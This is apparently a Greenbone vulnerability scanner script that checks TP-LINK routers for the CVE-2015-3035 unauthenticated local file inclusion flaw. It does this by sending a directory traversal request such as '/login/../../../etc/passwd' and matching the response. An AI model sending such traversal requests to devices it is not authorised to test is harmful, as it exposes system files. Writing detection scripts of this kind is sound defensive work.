# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105250");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-04-10 16:25:11 +0200 (Fri, 10 Apr 2015)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2024-07-16 17:58:47 +0000 (Tue, 16 Jul 2024)");

  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");

  script_cve_id("CVE-2015-3035");

  script_tag(name:"qod_type", value:"remote_active");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Multiple TP-LINK Products LFI Vulnerability (Apr 2015) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("Host/runs_unixoide");
  script_mandatory_keys("Router_Webserver/banner");

  script_tag(name:"summary", value:"Multiple TP-LINK devices are prone to a local file include
  (LFI) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following HTTP request shows how directory traversal can be
  used to gain access to files without prior authentication:

  ===============================================================================

  GET /login/../../../etc/passwd HTTP/1.1

  Host: <host>");

  script_tag(name:"impact", value:"An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts in the context of the webserver
  process. This may allow the attacker to compromise the application and the computer.");

  script_tag(name:"affected", value:"TP-LINK Archer C5 (Hardware version 1.2)

  TP-LINK Archer C7 (Hardware version 2.0)

  TP-LINK Archer C8 (Hardware version 1.0)

  TP-LINK Archer C9 (Hardware version 1.0)

  TP-LINK TL-WDR3500 (Hardware version 1.0)

  TP-LINK TL-WDR3600 (Hardware version 1.0)

  TP-LINK TL-WDR4300 (Hardware version 1.0)

  TP-LINK TL-WR740N (Hardware version 5.0)

  TP-LINK TL-WR741ND (Hardware version 5.0)

  TP-LINK TL-WR841N (Hardware version 9.0)

  TP-LINK TL-WR841N (Hardware version 10.0)

  TP-LINK TL-WR841ND (Hardware version 9.0)

  TP-LINK TL-WR841ND (Hardware version 10.0)");

  script_tag(name:"solution", value:"Please update to the latest firmware version.");

  script_xref(name:"URL", value:"https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20150410-0_TP-Link_Unauthenticated_local_file_disclosure_vulnerability_v10.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

banner = http_get_remote_headers( port:port );

if( ! banner ||
    ( "Server: Router Webserver" >!< banner && 'realm="TP-LINK' >!< banner && 'realm="TL-' >!< banner ) )
  exit( 0 );

files = traversal_files( "linux" );

foreach pattern( keys( files ) ) {
  file = files[pattern];

  url = "/login/../../../../../../../../" + file;

  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit(0);
  }
}

exit(99);
